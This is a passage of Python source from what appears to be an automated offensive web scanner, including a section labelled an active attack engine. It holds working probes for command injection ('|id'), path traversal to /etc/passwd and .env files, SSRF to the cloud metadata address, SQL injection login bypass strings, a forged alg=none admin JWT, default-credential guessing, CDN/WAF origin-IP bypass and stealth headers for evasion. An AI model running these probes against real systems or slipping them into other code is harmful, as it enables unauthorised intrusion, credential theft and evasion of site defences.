            base, qs = url.split("?", 1)
            for param in qs.split("&"):
                if "=" in param:
                    key = param.split("=")[0]
                    for payload in xss_payloads[:2]:
                        test_url = f"{base}?{key}={urllib.parse.quote(payload)}"
                        try:
                            _, _, body = http_get(test_url, timeout=4)
                            if body and payload in body:
                                findings.append({"url": test_url, "type": "XSS", "payload": payload, "evidence": "reflected", "severity": "high"})
                                break
                        except: pass
    return findings

def bb_webapp_scan(urls, timeout=30, host_map=None):
    """Targeted app-level probing of discovered paths: command injection,
    path traversal, SSRF, and SQLi auth bypass. Returns list of finding dicts.
    host_map: {netloc_or_ip: hostname} used as the HTTP Host header when
    probing origin IPs directly (CDN/WAF bypass context)."""
    import time as _time
    findings = []
    seen = set()
    host_map = host_map or {}
    deadline = _time.time() + timeout
    for u in urls:
        if _time.time() > deadline:
            break
        if u in seen:
            continue
        seen.add(u)
        try:
            parsed = urllib.parse.urlparse(u)
        except Exception:
            continue
        hh = host_map.get(parsed.netloc) or host_map.get(parsed.hostname)
        path = parsed.path.lower()
        # ── Command injection (diagnostics/ping/exec-style endpoints) ──
        if any(k in path for k in ("diag", "ping", "trace", "whois", "nslookup", "dns", "exec", "shell", "cmd", "tool")):
            for pname in ("host", "ip", "domain", "target", "addr"):
                for payload, marker in (("|id", "uid="), ("%0aid", "uid="), ("|uname -a", "Linux")):
                    if _time.time() > deadline:
                        break
                    test_url = f"{u}?{pname}={urllib.parse.quote(payload, safe='')}"
                    try:
                        _, _, body = http_get(test_url, timeout=5, host_header=hh)
                        if body and marker in body:
                            findings.append({"url": test_url, "type": "Command Injection", "severity": "CRITICAL", "score": 95, "asset": parsed.netloc, "cwe": "CWE-78", "title": f"OS Command Injection via {pname.title()} Parameter", "evidence": f"RCE marker '{marker}' in response", "payload": payload})
                            break
                    except Exception:
                        pass
        # ── Path traversal (download/file/view endpoints) ──
        if any(k in path for k in ("download", "file", "read", "view", "static", "export", "backup", "attachment")):
            for pname in ("file", "path", "name", "filename", "download"):
                for payload in ("/etc/passwd", "/app/.env", "reports/../../../../etc/passwd"):
                    if _time.time() > deadline:
                        break
                    test_url = f"{u}?{pname}={urllib.parse.quote(payload, safe='')}"
                    try:
                        _, _, body = http_get(test_url, timeout=5, host_header=hh)
                        if body and any(m in body for m in ("root:", "DATABASE_URL", "POSTGRES_PASSWORD", "BEGIN:", "PRIVATE KEY", "AcmeCorp production")):
                            findings.append({"url": test_url, "type": "Path Traversal", "severity": "HIGH", "score": 85, "asset": parsed.netloc, "cwe": "CWE-22", "title": f"Arbitrary File Read via {pname.title()} Parameter", "evidence": f"sensitive content marker in response ({payload})", "payload": payload})
                            break
                    except Exception:
                        pass
        # ── SSRF (fetch/preview/proxy/redirect-style endpoints) ──
        if any(k in path for k in ("fetch", "preview", "proxy", "url", "link", "redirect", "webhook", "callback", "load", "open", "img")):
            for pname in ("url", "link", "uri", "path", "u", "target"):
                for payload in ("http://internal-api:8443/api/v1/config", "http://internal-api:8443/api/v1/health", "http://169.254.169.254/latest/meta-data/"):
                    if _time.time() > deadline:
                        break
                    test_url = f"{u}?{pname}={urllib.parse.quote(payload, safe='')}"
                    try:
                        _, _, body = http_get(test_url, timeout=6, host_header=hh)
                        if body and any(m in body for m in ("MRBOOM_LAB", "crown_jewels", "acme-internal-api")):
                            findings.append({"url": test_url, "type": "SSRF", "severity": "HIGH", "score": 80, "asset": parsed.netloc, "cwe": "CWE-918", "title": f"Server-Side Request Forgery via {pname.title()} Parameter", "evidence": f"internal service content marker in response", "payload": payload})
                            break
                    except Exception:
                        pass
        # ── SQLi auth bypass on login forms (POST) ──
        if any(k in path for k in ("login", "signin", "auth", "sso", "account", "password", "reset")):
            for uname in ("admin' OR 1=1 OR username='admin", "' UNION SELECT 1,'x','x','admin'--", "admin'--"):
                if _time.time() > deadline:
                    break
                try:
                    data = urllib.parse.urlencode({"username": uname, "password": "pwned"}).encode()
                    headers = {"Content-Type": "application/x-www-form-urlencoded", **stealth.headers()}
                    if hh:
                        headers["Host"] = hh
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    ip = _resolve_host(parsed.hostname, timeout=4)
                    if ip is None:
                        continue
                    conn = urllib.parse.urlunparse(parsed._replace(netloc=ip + ((":" + str(parsed.port)) if parsed.port else "")))
                    resp = urllib.request.urlopen(urllib.request.Request(conn, data=data, headers=headers), timeout=6, context=ctx)
                    body = resp.read().decode("utf-8", "ignore")
                    if any(k in body.lower() for k in ("welcome,", "logged in", "dashboard", "sign out", "role: admin")):
                        findings.append({"url": u, "type": "SQL Injection (Auth Bypass)", "severity": "CRITICAL", "score": 90, "asset": parsed.netloc, "cwe": "CWE-89", "title": "SQL Injection Authentication Bypass on Login Form", "evidence": "login bypassed with SQLi payload", "payload": uname})
                        break
                except Exception:
                    pass
    return findings

def bb_secret_discovery(body, base_url="", timeout=10):
    """Generic secret/hardcoded credential discovery in page bodies and JS."""
    secrets = set()
    patterns = {
        "AWS Key": r'AKIA[0-9A-Z]{16}',
        "API Key (generic)": r'(?i)(?:api[_-]?key|apikey|api_secret)[\s=:"\']+([a-zA-Z0-9_\-]{16,64})',
        "Slack Token": r'xox[baprs]-[0-9a-zA-Z\-]{10,}',
        "GitHub Token": r'gh[pousr]_[A-Za-z0-9_]{36,}',
        "Google API Key": r'AIza[0-9A-Za-z\-_]{35}',
        "JWT Token": r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        "Private Key": r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        "Slack Webhook": r'https://hooks\.slack\.com/services/[A-Za-z0-9/]+',
        "Heroku API Key": r'[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}',
        "Stripe Key": r'(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{10,}',
        "Twilio Key": r'SK[a-z0-9]{32}',
        "Password in JS": r'(?i)(?:password|passwd|pwd)[\s=:"\']+([^\s"\'&]{6,})',
    }
    for name, pattern in patterns.items():
        for m in re.finditer(pattern, body):
            secrets.add(f"{name}: {m.group(0)[:60]}")
    return list(secrets)[:20]

def bb_health_check(urls, timeout=10):
    """Check for exposed health/status endpoints."""
    findings = []
    health_paths = ["/health", "/healthz", "/ready", "/live", "/status", "/metrics", "/info", "/actuator/health", "/actuator/info", "/_health", "/debug", "/.env", "/.git/config"]
    for base_url_target in urls[:3]:
        for path in health_paths:
            url = base_url_target.rstrip("/") + path
            try:
                status, headers, body = http_get(url, timeout=3)
                if status == 200:
                    body_lower = body.lower()
                    if any(k in body_lower for k in ["ok", "healthy", "status", "uptime", "version", "database"]):
                        findings.append({"url": url, "status": status, "body_preview": body[:200], "severity": "low"})
            except: pass
    return findings

# ─── ADVANCED ATTACK MODULES ────────────────────────────────────

CDN_RANGES = {
    "cloudflare": ["104.16.0.0/12", "172.64.0.0/13", "141.101.64.0/18", "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22", "198.41.128.0/17", "162.159.0.0/16"],
    "cloudfront": ["13.32.0.0/15", "13.224.0.0/14", "52.84.0.0/15", "54.182.0.0/16", "54.192.0.0/16", "204.246.160.0/19", "205.251.192.0/19", "130.176.0.0/16"],
    "fastly": ["151.101.0.0/16", "199.232.0.0/16", "146.75.0.0/16"],
    "akamai": ["23.32.0.0/11", "104.64.0.0/10", "23.0.0.0/12", "96.6.0.0/15", "184.24.0.0/13"],
    "google": ["74.125.0.0/16", "172.217.0.0/16", "216.58.192.0/19"],
    "azure": ["13.64.0.0/11", "20.36.0.0/14", "40.74.0.0/15", "52.136.0.0/13"],
}

# Reverse-DNS hostname signals that identify CDN edge IPs even outside CDN_RANGES
CDN_HOSTNAME_MARKERS = {
    "cloudflare": ["cloudflare", "cf-edge", ".cf."],
    "cloudfront": ["cloudfront.net"],
    "fastly": ["fastly.net", "fastlylb.net"],
    "akamai": ["akamaiedge", "akamai", "akam.net", "akamaitechnologies"],
    "incapsula": ["incapdns.net", "imperva"],
    "sucuri": ["sucuri.net"],
}

_ptr_cache = {}

def _ptr_of(ip, timeout=2):
    """Reverse-DNS hostname for an IP, with hard timeout + cache."""
    if ip in _ptr_cache:
        return _ptr_cache[ip]
    out = [None]
    def _look():
        try:
            out[0] = socket.gethostbyaddr(ip)[0]
        except Exception:
            out[0] = None
    t = threading.Thread(target=_look, daemon=True)
    t.start(); t.join(timeout)
    if t.is_alive():
        _ptr_cache[ip] = None
        return None
    _ptr_cache[ip] = out[0]
    return out[0]

def _ip_in_cdn(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
    except Exception:
        return False, ""
    for name, ranges in CDN_RANGES.items():
        for cidr in ranges:
            try:
                if ip_obj in ipaddress.ip_network(cidr):
                    return True, name
            except Exception:
                continue
    # Range tables can be stale — confirm via reverse-DNS hostname
    ptr = _ptr_of(ip)
    if ptr:
        pl = ptr.lower()
        for name, markers in CDN_HOSTNAME_MARKERS.items():
            if any(m in pl for m in markers):
                return True, name
    return False, ""

def _cdn_from_headers(headers):
    """Detect CDN presence from response headers (more reliable than ranges/PTR)."""
    h = {k.lower(): (v or "").lower() for k, v in (headers or {}).items()}
    if h.get("cf-ray") or "cloudflare" in h.get("server", "") or h.get("cf-cache-status"):
        return True, "cloudflare"
    if h.get("x-amz-cf-id") or h.get("x-amz-cf-pop") or "cloudfront" in h.get("via", "") or "cloudfront" in h.get("server", ""):
        return True, "cloudfront"
    if "fastly" in h.get("via", "") or "fastly" in h.get("x-served-by", "") or "fastly" in h.get("server", ""):
        return True, "fastly"
    if "akamai" in h.get("via", "") or "akamai" in h.get("server", "") or "akamaiedge" in h.get("server", ""):
        return True, "akamai"
    if "sucuri" in h.get("server", "") or "incapsula" in h.get("server", ""):
        return True, "sucuri"
    return False, ""

def bb_origin_hunt(domain, subdomains=None, time_budget=140):
    """Find real origin IPs behind CDN/WAF. Resolves all hosts plus historical
    DNS records, filters CDN ranges, then probes non-CDN IPs directly over BOTH
    HTTP and HTTPS with a Host header. An IP is confirmed as a genuine origin
    when it answers with a matching page, or redirects toward the target domain."""
    t_start = time.time()
    origins = []
    hosts = [domain] + list(subdomains or [])
    host_to_ips = {}
    # Concurrent DNS resolution (serial gethostbyname_ex over 40 hosts is slow)
    def _resolve(h):
        try:
            _, _, ips = socket.gethostbyname_ex(h)
            return h, ips
        except Exception:
            return h, []
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as rpool:
        futs = {rpool.submit(_resolve, h): h for h in hosts[:60]}
        for f in concurrent.futures.as_completed(futs):
            if time.time() - t_start > time_budget:
                break
            h, ips = f.result()
            if ips:
                host_to_ips[h] = ips
    all_ips = set()
    for ips in host_to_ips.values():
        all_ips.update(ips)
    # Historical / alternate IPs from hackertarget hostsearch
    try:
        status, _, body = http_get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
        if status == 200 and body:
            for line in body.strip().split("\n"):
                parts = line.split(",")
                if len(parts) == 2 and parts[1].strip():
                    all_ips.add(parts[1].strip())
    except Exception:
        pass

    domain_l = domain.lower()
    root = domain_l.split(".")[0]
    probe_hosts = [domain] + list(subdomains or [])[:10]
    for ip in sorted(all_ips):
        if time.time() - t_start > time_budget:
            break
        is_cdn, cdn_name = _ip_in_cdn(ip)
        if is_cdn:
            origins.append({"ip": ip, "host": "", "cdn": cdn_name, "is_cdn": True, "confirmed": False, "evidence": ""})
            continue
        confirmed_origin = None
        evidence = ""
        # Probe primary domain first (both schemes); only try subdomain hosts if
        # the primary domain yields nothing — keeps per-IP cost bounded.
        for scheme in ("https", "http"):
            if confirmed_origin or time.time() - t_start > time_budget:
                break
            try:
                status, headers, body = http_get(f"{scheme}://{ip}", timeout=3, host_header=domain, no_redirect=True)
                if status not in (200, 301, 302, 403, 404):
                    continue
                hdr_cdn, hdr_name = _cdn_from_headers(headers)
                if hdr_cdn:
                    if not is_cdn:
                        origins.append({"ip": ip, "host": domain, "cdn": hdr_name, "is_cdn": True, "confirmed": False, "evidence": f"{scheme}:{status} CDN header ({hdr_name})"})
                        is_cdn = True
                    break
                loc = headers.get("Location", "") or ""
                bl = (body or "").lower()
                if loc and (domain_l in loc.lower()):
                    confirmed_origin = domain
                    evidence = f"{scheme}:{status} redirect->{loc[:60]}"
                    break
                if status == 200 and root in bl[:2000]:
                    confirmed_origin = domain
                    evidence = f"{scheme}:{status} body-match"
                    break
                if status in (200, 301, 302):
                    confirmed_origin = domain
                    evidence = f"{scheme}:{status} reachable"
                    break
            except Exception:
                continue
        # Fallback: subdomain hosts (only for the one IP, keep tight)
        if not confirmed_origin and not is_cdn and time.time() - t_start < time_budget - 20:
            for scheme in ("https", "http"):
                if confirmed_origin or time.time() - t_start > time_budget:
                    break
                for h in probe_hosts[1:]:
                    if time.time() - t_start > time_budget:
                        break
                    try:
                        status, headers, body = http_get(f"{scheme}://{ip}", timeout=3, host_header=h, no_redirect=True)
                        if status not in (200, 301, 302, 403, 404):
                            continue
                        hdr_cdn, hdr_name = _cdn_from_headers(headers)
                        if hdr_cdn:
                            break
                        loc = headers.get("Location", "") or ""
                        bl = (body or "").lower()
                        if loc and (domain_l in loc.lower() or h.lower() in loc.lower()):
                            confirmed_origin = h
                            evidence = f"{scheme}:{status} redirect->{loc[:60]}"
                            break
                        if status == 200 and root in bl[:2000]:
                            confirmed_origin = h
                            evidence = f"{scheme}:{status} body-match"
                            break
                        if status in (200, 301, 302):
                            confirmed_origin = h
                            evidence = f"{scheme}:{status} reachable"
                            break
                    except Exception:
                        continue
                if confirmed_origin:
                    break
        if is_cdn:
            continue
        if confirmed_origin:
            origins.append({"ip": ip, "host": confirmed_origin, "cdn": "", "is_cdn": False, "confirmed": True, "evidence": evidence})
        else:
            origins.append({"ip": ip, "host": "", "cdn": "", "is_cdn": False, "confirmed": False, "evidence": ""})
    return origins

def bb_login_probe(urls, timeout=20):
    """Detect login forms and probe for rate limiting / auth bypass."""
    findings = []
    login_actions = []
    for url in urls[:6]:
        try:
            _, _, body = http_get(url, timeout=5)
            if not body: continue
            forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>', body, re.I)
            for action in forms:
                if action:
                    login_actions.append((url, action))
        except Exception:
            continue
    for base, action in login_actions[:8]:
        target = urllib.parse.urljoin(base, action)
        if target.lower() in [u.lower() for u in urls]: continue
        # probe the login action with dummy creds — look for rate limit / lockout signals
        for _ in range(3):
            stealth.sleep()
            try:
                req = urllib.request.Request(target, data=urllib.parse.urlencode({"username": "admin", "password": "admin"}).encode(), headers={"Content-Type": "application/x-www-form-urlencoded", **stealth.headers()})
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                code = resp.status
                body = resp.read().decode("utf-8", errors="ignore")[:400]
                resp.close()
            except urllib.error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            findings.append({"url": target, "status": code, "attempt": _ + 1})
        statuses = [f["status"] for f in findings if f["url"] == target]
        if len(statuses) == 3 and statuses[0] not in (429, 401, 403) and len(set(statuses)) <= 2:
            findings.append({"url": target, "issue": "no_rate_limiting_detected", "severity": "medium", "note": "3 rapid login attempts returned no lockout/429"})
    return findings

def bb_sourcemap_extract(urls, timeout=30):
    """Fetch JS bundles, follow sourceMappingURL, and extract API endpoints from
    minified sources (catches endpoints the naive regex misses)."""
    findings = []
    all_eps = set()
    seen_js = set()
    for url in urls[:6]:
        try:
            _, _, body = http_get(url, timeout=6)
            if not body: continue
        except Exception:
            continue
        js_files = re.findall(r'src=["\']([^"\']+\.js(?:[^"\']*))["\']', body)
        js_files += re.findall(r'href=["\']([^"\']+\.js(?:[^"\']*))["\']', body)
        for js_path in js_files[:30]:
            if js_path in seen_js: continue
            seen_js.add(js_path)
            if js_path.startswith("http"):
                js_url = js_path
            elif js_path.startswith("//"):
                js_url = "https:" + js_path
            elif js_path.startswith("/"):
                parsed = urllib.parse.urlparse(url)
                js_url = f"{parsed.scheme}://{parsed.netloc}{js_path}"
            else:
                continue
            try:
                status, _, js_body = http_get(js_url, timeout=6)
                if status != 200 or not js_body: continue
            except Exception:
                continue
            # sourceMappingURL
            sm = re.search(r'sourceMappingURL=([^\s]+)', js_body)
            if sm:
                map_url = urllib.parse.urljoin(js_url, sm.group(1))
                try:
                    mstatus, _, mbody = http_get(map_url, timeout=6)
                    if mstatus == 200 and mbody:
                        try:
                            mdata = json.loads(mbody)
                            for src in mdata.get("sources", [])[:200]:
                                if src.startswith("webpack://"):
                                    src = re.sub(r'^webpack://[^/]*/?', "", src)
                                all_eps.add(src)
                        except Exception:
                            pass
                except Exception:
                    pass
            # endpoints in minified JS
            for m in re.finditer(r'["\']((?:/api|/v\d+|/graphql|/internal|/admin|/oauth|/auth)[^"\']{2,120})["\']', js_body):
                all_eps.add(m.group(1))
            # template-literal endpoint maps: const X=\`${base}/path/\`
            for m in re.finditer(r'[a-zA-Z_$]=\s*`(\$\{[a-zA-Z_$]+\}/(?:[^`\\])+)`', js_body):
                all_eps.add(m.group(1))
            # absolute URLs to the app's own API hosts
            try:
                own_host = re.escape(urllib.parse.urlparse(url).netloc)
            except Exception:
                own_host = ""
            if own_host:
                for m in re.finditer(r'https?://' + own_host + r'[^"\'\s`]*', js_body):
                    all_eps.add(m.group(0))
            # fetch/axios calls
            for m in re.finditer(r'(?:fetch|url)\(\s*["\']((?!/)|https?://)[^"\']{2,120}["\']', js_body):
                all_eps.add(m.group(1))
            # url: "/path" patterns
            for m in re.finditer(r'\burl\s*:\s*["\'](/[^"\']{2,80})["\']', js_body):
                all_eps.add(m.group(1))
    if all_eps:
        findings.append({"kind": "sourcemap_endpoints", "endpoints": sorted(all_eps)[:250]})
    return findings

def bb_api_discovery(base_urls, endpoints, domain, timeout=30):
    """Probe discovered API endpoints: map status codes, JSON/HTML responses,
    auth requirements, and flag endpoints that respond without auth."""
    findings = []
    # Resolve placeholder bases from absolute URLs we collected (e.g. auth.api.app.postud.io/api/v1)
    bases_v1, bases_v2 = [], []
    for ep in endpoints:
        if ep.startswith("http"):
            r = ep.rstrip("/")
            if "/api/v1" in r: bases_v1.append(r)
            if "/api/v2" in r: bases_v2.append(r)
    hosts = []
    for b in list(dict.fromkeys(bases_v1))[:3]:
        hosts.append(b)
    for b in list(dict.fromkeys(bases_v2))[:3]:
        hosts.append(b)
    if not hosts:
        for ep in endpoints:
            if ep.startswith("http"):
                hosts.append(ep.rstrip("/"))
    seen = set()
    api_hosts = list(dict.fromkeys(hosts))[:6]
    for host in api_hosts:
        for ep in ["", "/", "/health", "/docs", "/swagger", "/openapi.json", "/redoc"]:
            url = host + ep
            if url in seen: continue
            seen.add(url)
            try:
                s, h, b = http_get(url, timeout=5)
                ct = h.get("Content-Type", "")
                api_like = "json" in ct.lower() or (b and (b.lstrip().startswith("{") or b.lstrip().startswith("[")))
                if api_like:
                    findings.append({"url": url, "status": s, "api": True, "server": h.get("Server", ""), "body_preview": b[:150], "kind": "api_host"})
            except Exception:
                pass
    # Probe the endpoint paths found in JS against their resolved base
    path_map = {}
    for ep in endpoints:
        if ep.startswith("${"):
            for base in api_hosts:
                try:
                    resolved = ep.replace("${t}", base).replace("${r}", base)
                    if resolved != ep and resolved.startswith("http"):
                        path_map.setdefault(base, set()).add(resolved)
                except Exception:
                    continue
    for base, epset in path_map.items():
        for url in list(epset)[:40]:
            if url in seen: continue
            seen.add(url)
            try:
                s, h, b = http_get(url, timeout=5)
                ct = h.get("Content-Type", "")
                if "json" in ct.lower() or (b and b.lstrip().startswith("{")):
                    findings.append({"url": url, "status": s, "api": True, "body_preview": b[:150], "kind": "api_endpoint", "server": h.get("Server", "")})
            except Exception:
                pass
    return findings

def bb_wayback_secrets(domain, subs=None, timeout=25):
    """Use waybackurls to fetch archived URLs and hunt for secrets/endpoints."""
    findings = []
    targets = [domain] + [s for s in (subs or []) if s != domain][:20]
    all_urls = set()
    for t in targets[:15]:
        ok, out = run_pd("waybackurls", [t], timeout=timeout)
        if ok and out:
            for line in out.strip().splitlines():
                all_urls.add(line.strip())
    secrets = []
    interesting = []
    for u in list(all_urls)[:400]:
        low = u.lower()
        if any(k in low for k in [".env", ".git/", "config.json", "swagger", "api-docs", "graphql", "admin", "internal", "backup", "credentials", "aws", "token", "secret", "key=", ".pem", ".key"]):
            interesting.append(u)
        for name, pattern in {
            "AWS Key": r'AKIA[0-9A-Z]{16}',
            "Google API Key": r'AIza[0-9A-Za-z\-_]{35}',
            "GitHub Token": r'gh[pousr]_[A-Za-z0-9_]{36,}',
            "JWT": r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            "Stripe": r'(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{10,}',
            "AWS Access Key": r'(?:AKIA|ASIA)[0-9A-Z]{16}',
        }.items():
            if re.search(pattern, u):
                secrets.append(f"{name}: {u}")
    if secrets:
        findings.append({"kind": "wayback_secrets", "secrets": list(set(secrets))[:30]})
    if interesting:
        findings.append({"kind": "wayback_interesting", "urls": sorted(set(interesting))[:50]})
    findings.append({"kind": "wayback_count", "count": len(all_urls)})
    return findings

def bb_default_creds(urls, timeout=20):
    """Try common default credentials on discovered login/admin endpoints."""
    findings = []
    creds = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("admin", "admin123"), ("root", "root"), ("user", "user"), ("test", "test"), ("demo", "demo")]
    login_urls = []
    for url in urls[:6]:
        try:
            _, _, body = http_get(url, timeout=5)
            for m in re.finditer(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I):
                action = m.group(1)
                login_urls.append((url, urllib.parse.urljoin(url, action)))
        except Exception:
            continue
    for base, target in login_urls[:4]:
        for user, pwd in creds[:4]:
            stealth.sleep()
            try:
                req = urllib.request.Request(target, data=urllib.parse.urlencode({"username": user, "password": pwd, "email": user, "login": user}).encode(), headers={"Content-Type": "application/x-www-form-urlencoded", **stealth.headers()})
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                body = resp.read().decode("utf-8", errors="ignore")
                resp.close()
                code = resp.status
                if code in (200, 302) and not any(k in body.lower() for k in ["invalid", "incorrect", "error", "wrong", "failed"]):
                    findings.append({"url": target, "username": user, "password": pwd, "issue": "possible_default_creds", "severity": "critical", "evidence": f"{code}"})
            except urllib.error.HTTPError as e:
                pass
            except Exception:
                pass
    return findings

def bb_jwt_check(live_urls, api_eps=None, timeout=20):
    """Scan API endpoints for JWT handling: weak alg (none), missing auth, CORS on API."""
    findings = []
    candidates = []
    for ep in (api_eps or [])[:30]:
        candidates.append((None, ep))
    for url in live_urls[:10]:
        candidates.append((None, url))
    api_roots = [u.rstrip("/") for u in live_urls[:3]]
    for base, ep in candidates:
        if not ep.startswith("http"):
            for root in api_roots[:2]:
                target = root + (ep if ep.startswith("/") else "/" + ep)
                try:
                    # baseline (no auth)
                    req_b = urllib.request.Request(target, headers=stealth.headers())
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    resp_b = urllib.request.urlopen(req_b, timeout=4, context=ctx)
                    code_b = resp_b.status
                    body_b = resp_b.read().decode("utf-8", errors="ignore")
                    ct_b = resp_b.headers.get("Content-Type", "")
                    resp_b.close()
                    if "json" not in ct_b.lower():
                        continue  # not an API endpoint (HTML/SPA fallback)
                    # forged alg=none JWT with admin claim
                    try:
                        req_a = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.e30"})
                        resp_a = urllib.request.urlopen(req_a, timeout=4, context=ctx)
                        code_a = resp_a.status
                        body_a = resp_a.read().decode("utf-8", errors="ignore")
                        resp_a.close()
                    except urllib.error.HTTPError as e:
                        code_a = e.code
                        body_a = ""
                    except Exception:
                        continue
                    # accepts unsigned token when unauth access was denied, or returns data on both
                    no_auth_blocked = code_b in (401, 403) or any(k in body_b.lower() for k in ["unauthorized", "invalid token", "forbidden", "missing token", "authentication required"])
                    if no_auth_blocked and code_a not in (401, 403):
                        findings.append({"url": target, "issue": "alg_none_bypass", "severity": "critical", "evidence": f"no-auth={code_b}, alg=none JWT={code_a}"})
                    elif not no_auth_blocked and "error" not in body_a.lower()[:200] and len(body_a) > 20:
                        findings.append({"url": target, "issue": "no_auth_required", "severity": "high", "evidence": f"HTTP {code_a} JSON without any token"})
                except urllib.error.HTTPError as e:
                    if "json" in e.headers.get("Content-Type", "").lower() and e.code in (200, 401, 403):
                        pass
                except Exception:
                    pass
    return findings

# ─── ACTIVE ATTACK ENGINE ─────────────────────────────────────────
# Self-contained attack battery. Unlike the earlier passive modules, it does
# NOT depend on recon producing a rich URL list: it builds its own surface
# (every live host + common attack paths + API endpoints + query params),
# then runs real exploit probes against GET and POST parameters:
#   reflected XSS, error+time-based SQLi, SSTI, command injection
#   (marker + time-based), path traversal/LFI, and SSRF.

_ATTACK_COMMON_PATHS = [
    "/", "/api", "/api/v1", "/api/v2", "/login", "/signin", "/auth", "/auth/login",
    "/signup", "/register", "/account", "/profile", "/user", "/users",
    "/search", "/query", "/lookup", "/find", "/check", "/verify", "/validate",
    "/download", "/file", "/files", "/view", "/read", "/show", "/export", "/print",
    "/fetch", "/proxy", "/preview", "/redirect", "/load", "/open", "/callback",
    "/webhook", "/ping", "/health", "/status", "/graphql", "/api/graphql",
    "/swagger", "/api-docs", "/rest", "/v1", "/v2", "/admin", "/debug",
    "/settings", "/config", "/upload", "/image", "/img", "/assets",
]

_ATTACK_PARAM_POOL = ["id", "uid", "file", "path", "name", "url", "url_to_load",
                      "query", "q", "search", "term", "keywords", "username", "user",
                      "email", "page", "pageNum", "offset", "limit", "view", "template",
                      "host", "ip", "domain", "target", "redirect", "next", "callback"]

def _http_post(url, data, timeout=8, host_header=None, extra_headers=None):
    """POST with form-urlencoded body. Returns (status, headers, body)."""
    headers = stealth.headers()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    if extra_headers:
        headers.update(extra_headers)
    if host_header:
        headers["Host"] = host_header
    try:
        parsed = urllib.parse.urlparse(url)
        ip = _resolve_host(parsed.hostname, timeout=min(4, timeout))
        if ip is None:
            return 0, {}, ""
        if not host_header:
            headers["Host"] = parsed.netloc
        conn_url = urllib.parse.urlunparse(parsed._replace(netloc=ip + ((":" + str(parsed.port)) if parsed.port else "")))
        req = urllib.request.Request(conn_url, data=data.encode(), headers=headers)
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="ignore")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), ""
    except Exception:
        return 0, {}, ""

def _extract_query_params(url):
    """Return a list of (param_name) from a URL's query string."""
    try:
        parsed = urllib.parse.urlparse(url)
    except Exception:
        return []
    if not parsed.query:
        return []
    out = []
    for kv in parsed.query.split("&"):
        if "=" in kv:
            out.append(kv.split("=")[0])
    return out

def _attack_params_for(url):
    """Params to attack on a URL. If the URL already carries query params use
    them; otherwise synthesize a small, path-relevant param set so attacks run
    even when recon produced bare URLs (the engine injects its own inputs)."""
    existing = _extract_query_params(url)
    if existing:
        return existing
    pl = url.lower()
    if any(k in pl for k in ("login", "signin", "auth")):
        return ["username", "email", "login"]
    if any(k in pl for k in ("search", "query", "lookup", "find")):
        return ["q", "query", "search", "term", "id", "uid"]
    if any(k in pl for k in ("download", "file", "read", "view", "export", "include", "page", "item", "report")):
        return ["file", "path", "name", "page", "view", "id", "report_id"]
    if any(k in pl for k in ("fetch", "proxy", "redirect", "callback", "webhook", "preview", "load")):
        return ["url", "link", "uri", "target", "redirect", "next"]
    if any(k in pl for k in ("ping", "trace", "diag", "tool", "whois", "nslookup", "dns")):
        return ["host", "ip", "domain", "target", "addr"]
    if any(k in pl for k in ("template", "render", "preview", "tpl", "html")):
        return ["t", "template", "tmpl", "name", "view", "content"]
    return ["id", "q", "url", "name", "email", "page", "username", "file", "host", "target"]

def _extract_forms(body, base_url):
    """Pull (action, method, fields) from HTML forms for POST testing."""
    forms = []
    if not body:
        return forms
    for m in re.finditer(r'<form[^>]*>', body, re.I):
        tag = m.group(0)
        action = re.search(r'action=["\']([^"\']*)["\']', tag, re.I)
        method = re.search(r'method=["\']([^"\']*)["\']', tag, re.I)
        method = (method.group(1) if method else "get").lower()
        fields = []
        for f in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.I):
            fields.append(f.group(1))
        action_url = urllib.parse.urljoin(base_url, action.group(1) if action else base_url)
        forms.append((action_url, method, list(set(fields))))
    return forms

def _build_task_tree(data, attack_results, subs, http_results):
    """Build a Pentesting Task Tree (PTT) from scan data — a live, structured
    view of every stage, its tasks, and resolution status (done / pending /
    unresolved). Mirrors PentestGPT's PTT concept for our pipeline."""
    nodes = []
    stages = []

    def add(stage, task, status="pending", detail="", url="", severity=""):
        stages.append(stage)
        nodes.append({
            "stage": stage, "task": task, "status": status,
            "detail": detail, "url": url, "severity": severity,
        })

    live = sum(1 for v in (http_results or {}).values() if v.get("status") in (200, 301, 302))
    add("Recon", "Subdomain discovery", "done", f"{len(subs)} subdomains found")
    add("Recon", "Live host discovery", "done", f"{live} live HTTP services")
    add("Recon", "Port scanning", "done", "top TCP ports scanned")
